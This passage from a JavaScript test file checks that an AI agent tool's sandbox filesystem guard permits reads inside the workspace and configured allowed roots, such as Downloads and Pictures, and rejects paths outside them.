  } finally {
    if (prev === undefined) delete process.env.PI_ENSEMBLE_WORKSPACE_ROOT;
    else process.env.PI_ENSEMBLE_WORKSPACE_ROOT = prev;
    rmSync(root, { recursive: true, force: true });
    rmSync(sibling, { recursive: true, force: true });
  }
}

// === PR #213: PI_ENSEMBLE_ALLOWED_ROOTS extends the FS boundary ===
// For image drag-and-drop: the wrapper bind-mounts $HOME/Downloads,
// $HOME/Desktop, $HOME/Pictures and exports their paths in
// PI_ENSEMBLE_ALLOWED_ROOTS. The fs-guard treats those as in-bounds.
{
  const { checkSandboxFsArgs } = await import("../src/sandbox-fs-guard.js");

  const workspace = realpathSync(mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-fs-ws-")));
  const downloads = realpathSync(mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-fs-dl-")));
  const pictures = realpathSync(mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-fs-pics-")));
  const outside = realpathSync(mkdtempSync(path.join(os.tmpdir(), "pi-ensemble-fs-outside-")));

  const prevWs = process.env.PI_ENSEMBLE_WORKSPACE_ROOT;
  const prevAllowed = process.env.PI_ENSEMBLE_ALLOWED_ROOTS;
  try {
    process.env.PI_ENSEMBLE_WORKSPACE_ROOT = workspace;
    process.env.PI_ENSEMBLE_ALLOWED_ROOTS = `${downloads}:${pictures}`;

    // Path inside workspace → permitted (existing behavior).
    const wsPath = checkSandboxFsArgs("read", { path: path.join(workspace, "code.ts") });
    assert(
      wsPath.ok === true,
      "PR #213: workspace path still permitted with allowed-roots set",
    );

    // Path inside an ALLOWED root → permitted (the new behavior).
    const dlPath = checkSandboxFsArgs("read", { path: path.join(downloads, "screenshot.png") });
    assert(
      dlPath.ok === true,
      "PR #213: paths inside PI_ENSEMBLE_ALLOWED_ROOTS dirs are permitted",
    );

    const picPath = checkSandboxFsArgs("read", { path: path.join(pictures, "photo.jpg") });
    assert(
      picPath.ok === true,
      "PR #213: multiple allowed roots — all of them permit reads",
    );

    // Path OUTSIDE both workspace and allowed roots → still rejected.
    const outsidePath = checkSandboxFsArgs("read", { path: path.join(outside, "secret.txt") });
    assert(
      outsidePath.ok === false,
      "PR #213: paths outside workspace AND outside allowed roots still rejected",
    );
    if (!outsidePath.ok) {
      assert(
        outsidePath.reason.includes(downloads) && outsidePath.reason.includes(pictures),
        "PR #213: rejection reason lists all permitted roots so the LLM can react",
      );
    }

    // Empty PI_ENSEMBLE_ALLOWED_ROOTS → only workspace permits (regression
    // guard for the workspace-only mode).
    process.env.PI_ENSEMBLE_ALLOWED_ROOTS = "";
    const dlAfterUnset = checkSandboxFsArgs("read", { path: path.join(downloads, "x.png") });
    assert(
      dlAfterUnset.ok === false,
      "PR #213: clearing PI_ENSEMBLE_ALLOWED_ROOTS reverts to workspace-only",
    );
  } finally {
    if (prevWs === undefined) delete process.env.PI_ENSEMBLE_WORKSPACE_ROOT;
    else process.env.PI_ENSEMBLE_WORKSPACE_ROOT = prevWs;
    if (prevAllowed === undefined) delete process.env.PI_ENSEMBLE_ALLOWED_ROOTS;
    else process.env.PI_ENSEMBLE_ALLOWED_ROOTS = prevAllowed;
    rmSync(workspace, { recursive: true, force: true });
    rmSync(downloads, { recursive: true, force: true });
    rmSync(pictures, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
}

console.log("\n=== test-permission-guard summary ===");
console.log(`exit ${exitCode}`);
process.exit(exitCode);
